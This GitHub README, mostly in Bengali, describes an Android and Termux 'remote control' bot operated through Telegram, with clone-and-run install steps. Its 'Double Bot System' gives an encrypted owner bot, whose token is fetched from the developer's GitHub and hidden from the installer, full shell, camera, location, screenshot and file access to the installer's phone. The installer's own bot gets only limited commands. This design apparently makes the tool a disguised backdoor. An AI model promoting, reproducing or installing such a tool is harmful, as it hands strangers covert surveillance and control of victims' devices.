# 🤖 AHM Remote Control Bot

<div align="center">

![Python](https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python)
![Telegram](https://img.shields.io/badge/Telegram-Bot-26A5E4?style=for-the-badge&logo=telegram)
![Platform](https://img.shields.io/badge/Platform-Android%20%7C%20Linux-green?style=for-the-badge)
![License](https://img.shields.io/badge/License-Private-red?style=for-the-badge)

**টেলিগ্রামের মাধ্যমে আপনার Android ডিভাইস সম্পূর্ণ নিয়ন্ত্রণ করুন**

</div>

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔐 **Double Bot System** | Owner Bot (Encrypted) + User Bot (Manual) |
| 📱 **Device Control** | Battery, Storage, WiFi, Location |
| 📷 **Camera Access** | Front & Back camera, Screenshot |
| 🔦 **Hardware Control** | Torch, Volume, Vibrate, Lock |
| 📁 **File Manager** | ls, cd, cat, rm, mv, cp, mkdir |
| ⚡ **Shell Access** | যেকোনো Linux command চালান |
| 🔔 **Auto Notification** | Bot চালু হলে সাথে সাথে notification |
| 🌐 **Auto Update** | GitHub থেকে auto config load |

---

## 🚀 Quick Install

### Requirements
- Android ফোন + [Termux](https://f-droid.org/en/packages/com.termux/)
- Telegram Account
- Internet Connection

### One-Click Setup

```bash
# Step 1: Clone করুন
git clone https://github.com/Arif91786/remotebot.git

# Step 2: ফোল্ডারে যান
cd remotebot

# Step 3: চালান
python3 install.py
```

> শুধু **User Bot Token** ও **Chat ID** দিন — বাকি সব automatic! ✅

---

## 🔐 Double Bot System

```
┌─────────────────────────────────────┐
│         AHM Double Bot              │
├──────────────────┬──────────────────┤
│  👑 Owner Bot    │  👤 User Bot     │
│  (Encrypted)     │  (Manual)        │
├──────────────────┼──────────────────┤
│  GitHub থেকে    │  install.py তে   │
│  Auto Load ✅    │  নিজে set করুন  │
├──────────────────┼──────────────────┤
│  সব command ✅   │  সীমিত command  │
│  /shell ✅       │  /shell ❌       │
└──────────────────┴──────────────────┘
```

---

## 📋 Commands

### 👑 Owner Commands (সব কিছু)

| Command | Description |
|---------|-------------|
| `/start` | Bot মেনু দেখুন |
| `/shell <cmd>` | যেকোনো command চালান |
| `/battery` | Battery status |
| `/info` | Device info |
| `/storage` | Storage info |
| `/wifi` | WiFi info |
| `/ip` | IP address |
| `/screenshot` | Screenshot নিন |
| `/cam_front` | Front camera |
| `/cam_back` | Back camera |
| `/torch_on` | Torch চালু |
| `/torch_off` | Torch বন্ধ |
| `/vol_up` | Volume বাড়ান |
| `/vol_down` | Volume কমান |
| `/mute` | Mute করুন |
| `/lock` | ফোন lock করুন |
| `/location` | Location দেখুন |

### 📁 File Manager (Owner Only)

| Command | Description |
|---------|-------------|
| `/ls` | ফাইল তালিকা |
| `/cd <path>` | ফোল্ডার বদলান |
| `/cat <file>` | ফাইল পড়ুন |
| `/rm <file>` | ফাইল মুছুন |
| `/mv <src> <dst>` | ফাইল সরান |
| `/cp <src> <dst>` | ফাইল কপি করুন |
| `/mkdir <name>` | ফোল্ডার তৈরি |
| `/get <file>` | ফাইল download |
| `/upload` | ফাইল upload |

### 👤 User Commands (সীমিত)

| Command | Description |
|---------|-------------|
| `/start` | Bot মেনু |
| `/battery` | Battery status |
| `/storage` | Storage info |
| `/ip` | IP address |
| `/screenshot` | Screenshot |
| `/cam_front` | Front camera |
| `/cam_back` | Back camera |

---

## ⚙️ Manual Setup (Advanced)

### Step 1: Termux Setup
```bash
pkg update && pkg upgrade
pkg install python git
pip install python-telegram-bot==21.5 requests
```

### Step 2: BotFather থেকে Bot বানান
```
1. Telegram এ @BotFather খুলুন
2. /newbot লিখুন
3. Bot এর নাম দিন
4. Token কপি করুন
```

### Step 3: Chat ID বের করুন
```
1. আপনার bot কে message পাঠান
2. এই URL খুলুন:
   https://api.telegram.org/bot<TOKEN>/getUpdates
3. "chat":{"id": XXXXXXX} — এই number টা Chat ID
```

### Step 4: Install করুন
```bash
python3 install.py
```

---

## 🔄 Bot বন্ধ ও চালু

```bash
# বন্ধ করতে
pkill -f remotebot.py

# চালু করতে
python3 install.py

# Background এ চালাতে
nohup python3 install.py > /dev/null 2>&1 &

# Log দেখতে
tail -f /storage/emulated/0/bot.log
```

---

## 📁 File Structure

```
remotebot/
├── 📄 install.py      → One-click installer
├── 🤖 remotebot.py    → মূল বট
├── 🔐 .owner.enc      → Encrypted owner config
├── 🔑 .owner.key      → Decryption key
└── 📖 README.md       → এই ফাইল
```

---

## ⚠️ Security Notice

- ✅ Owner Bot Token সম্পূর্ণ **encrypted**
- ✅ কেউ ফাইল দেখলেও token বুঝতে পারবে না
- ✅ User Bot শুধু **সীমিত** command পাবে
- ❌ `.owner.key` কাউকে দেবেন না
- ❌ Bot Token কখনো publicly share করবেন না

---

## 👨‍💻 Developer

<div align="center">

**Created by AHM**

![GitHub](https://img.shields.io/badge/GitHub-Arif91786-black?style=for-the-badge&logo=github)

*This Tool is helping your Broken Android Device*

</div>

---

<div align="center">
⭐ যদি useful মনে হয় Star দিন!
</div>
